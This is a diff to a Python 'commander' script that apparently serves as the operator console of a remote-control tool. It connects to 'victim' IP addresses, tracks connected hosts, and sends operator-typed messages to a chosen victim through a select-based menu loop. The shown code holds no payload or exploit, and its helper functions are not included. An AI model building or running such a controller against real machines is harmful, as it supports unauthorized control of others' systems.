@@ -1,66 +1,64 @@
+import constants
+from commander_utils import *
 import socket
 import select
 import sys
 
+
 if __name__ == '__main__':
-    # Create a socket
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Initialization + GetOpts
+    source_ip, source_port, destination_ip, destination_port = parse_arguments()
 
-    # Bind the socket to a specific host and port
-    server_address = ("localhost", 8080)
-    server_socket.bind(server_address)
+    # Initialize server socket and socket lists
+    server_socket = initialize_server_socket(source_ip, source_port)
 
-    # Listen for incoming connections
-    server_socket.listen(5)
-
-    # List of sockets to monitor for readability (includes the server socket)
+    # List of sockets to monitor for readability (includes the server and stdin FDs)
     sockets_to_read = [server_socket, sys.stdin]
 
-    # List to keep track of connected client sockets and their addresses
+    # Initialize client list to keep track of connected client sockets and their addresses (IP, Port)
+    # Key/Value Pair => [Socket] : (IP, Port)
     connected_clients = {}
 
-    print("[+] Server is listening on", server_address)
+    # Initial connect to victim as passed by argument (and put in sockets_to_read)
+    print_config(destination_ip, destination_port, (source_ip, source_port))
+    connect_to_client(sockets_to_read, connected_clients, destination_ip, destination_port)
 
     while True:
-        # Use select to monitor sockets for readability
+        # Use select to monitor multiple sockets
         readable, _, _ = select.select(sockets_to_read, [], [])
 
+        # Display menu & prompt user selection
+        command = display_menu()
+
         for sock in readable:
+            # a) Handle new connections
             if sock is server_socket:
                 # This means there is a new incoming connection
                 client_socket, client_address = server_socket.accept()
-                print("New connection from:", client_address)
+                print("[+] New connection from:", client_address)
                 sockets_to_read.append(client_socket)
 
                 # Add the new client socket to the connected_clients dictionary
                 connected_clients[client_socket] = client_address
 
-            # Read from stdin file descriptor
+            # b) Read from stdin file descriptor (Initiate Menu from keystroke)
             elif sock is sys.stdin:
-                command = sys.stdin.readline().strip()
+                if command == constants.PERFORM_MENU_ITEM_FIVE:  # Disconnect from victim
+                    disconnect_from_client(sockets_to_read, connected_clients,
+                                           destination_ip, destination_port)
 
-                if command == "connect":  # a) For Connecting to victim
-                    target_ip = input("[+] Enter target IP address: ")
-                    target_port = int(input("[+] Enter target port: "))
-                    try:
-                        # Create a new client socket and initiate the connection
-                        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        target_socket.connect((target_ip, target_port))
-                        print("[+] Connected to", (target_ip, target_port))
+                if command == "connect":  # a) For connecting to a new victim
+                    target_ip = input("[+] Enter victim IP address: ")
+                    target_port = int(input("[+] Enter victim port: "))
+                    connect_to_client(sockets_to_read, connected_clients, target_ip, target_port)
 
-                        # Add the new client socket to the connected_clients dictionary
-                        connected_clients[target_socket] = (target_ip, target_port)
-                        sockets_to_read.append(target_socket)
-                    except Exception as e:
-                        print("[+] Connection error:", str(e))
-
-                if command == "send":  # For Sending things to a specific victim
+                if command == "send":  # b) For sending things to a specific victim
                     target_socket = None
                     target_ip = input("[+] Enter target IP address: ")
                     target_port = int(input("[+] Enter target port: "))
                     msg = input(f"[+] Type what you want to send to {target_ip} on port {target_port}: ")
 
-                    # Find a specific client socket to send data to (if multiple clients)
+                    # Find a specific client socket from client socket list to send data to
                     for client_sock, (ip, port) in connected_clients.items():
                         if ip == target_ip and port == target_port:
                             target_socket = client_sock
@@ -74,8 +72,9 @@ if __name__ == '__main__':
                         except Exception as e:
                             print("[+] Error sending to", (target_ip, target_port), ":", str(e))
                     else:
-                        print("[+] Target client not found!")
+                        print("[+] ERROR: Target client not found!")
 
+            #  c) If not server or stdin sockets, then handle data coming from clients
             else:
                 # Data is available to read from an existing client connection
                 data = sock.recv(1024)
